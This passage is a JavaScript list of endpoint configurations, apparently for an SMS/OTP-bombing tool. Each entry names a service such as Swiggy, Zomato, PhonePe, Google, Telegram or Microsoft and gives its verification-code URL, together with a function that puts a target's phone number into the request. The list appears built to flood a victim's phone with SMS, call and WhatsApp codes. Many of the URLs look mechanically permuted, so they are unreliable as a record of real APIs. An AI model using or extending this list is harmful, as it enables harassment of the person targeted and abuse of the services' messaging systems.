  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  
  // --- New SMS list ---
  {
        'name': 'Hotstar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'PUT',
        'url': 'https://api.hotstar.com/um/v3/users/register?register-by=phone_otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"${phone}","country_prefix":"91"}`
    },
    {
        'name': 'Zomato_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.zomato.com/webroutes/auth/login',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"country_id":1,"phone":"${phone}","verification_type":"sms","method":"phone"}`
    },
    {
        'name': 'Flipkart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://1.rome.api.flipkart.com/1/action/view',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"${phone}","loginType":"MOBILE","verificationType":"OTP"}}`
    },
    {
        'name': 'Paytm_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.paytm.com/v2/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"mobile":"${phone}","email":"","clientId":"paytm-web-secure"}`
    },
    {
        'name': 'Amazon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.amazon.in/ap/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"mobileNumber":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.google.com/accounts/accounts/sendphoneverificationcode',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phoneNumber":"+91${phone}","useNewV1Endpoint":true}`
    },
    {
        'name': 'Uber_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://auth.uber.com/v1/signup',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"+91${phone}","country_code":"IN"}`
    },
    {
        'name': 'Swiggy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.swiggy.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instagram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.instagram.com/api/v1/web/accounts/send_verification_code/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"+91${phone}"}`
    },
    {
        'name': 'WhatsApp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.whatsapp.com/app/phone-verify/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"91${phone}","platform":"android"}`
    },
    {
        'name': 'Telegram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"+91${phone}","api_id":"12345"}`
    },
    {
        'name': 'Facebook_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.facebook.com/ajax/signup/phone/send_code.php',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country_code":"in"}`
    },
    {
        'name': 'Twitter_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.twitter.com/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"+91${phone}","device_id":"test"}`
    },
    {
        'name': 'Netflix_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.netflix.com/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country":"IN"}`
    },
    {
        'name': 'PhonePe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.phonepe.com/apis/identity/v1/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phoneNumber":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GooglePay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://pay.google.com/api/v1/accounts/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}"}`
    },
    {
        'name': 'GPay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://gpay.app.goog/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone_number":"${phone}","country":"IN"}`
    },
    {
        'name': 'Meesho_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meesho.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","country_code":"91"}`
    },
    {
        'name': 'Snapchat_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.snapchat.com/accounts/verification_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country":"in"}`
    },
    {
        'name': 'LinkedIn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.linkedin.com/uas/verification/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country":"in"}`
    },
    {
        'name': 'WhatsApp_Business_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://business.whatsapp.com/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"91${phone}"}`
    },
    {
        'name': 'Signal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.signal.org/v1/accounts/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","region":"IN"}`
    },
    {
        'name': 'Discord_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://discord.com/api/v9/auth/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country":"IN"}`
    },
    {
        'name': 'Twitter_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://x.com/i/api/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}"}`
    },
    {
        'name': 'Telegram_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","api_id":"12345"}`
    },
    {
        'name': 'Microsoft_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://login.microsoftonline.com/common/phone/sendcode',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","country":"IN"}`
    },
    {
        'name': 'Apple_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://appleid.apple.com/auth/verify/phone',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"+91${phone}","countryCode":"91"}`
    },
    {
        'name': 'Amazon_Login_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.amazon.in/ap/signin',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"mobileNumber":"${phone}","countryCode":"91","type":"login"}`
    },
    {
        'name': 'Myntra_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.myntra.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flipkart_Grocery_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://grocery.flipkart.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nykaa_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nykaa.com/auth/v1/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","country":"IN"}`
    },
    {
        'name': 'Ola_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.olacabs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Rapido_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rapido.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Oyo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
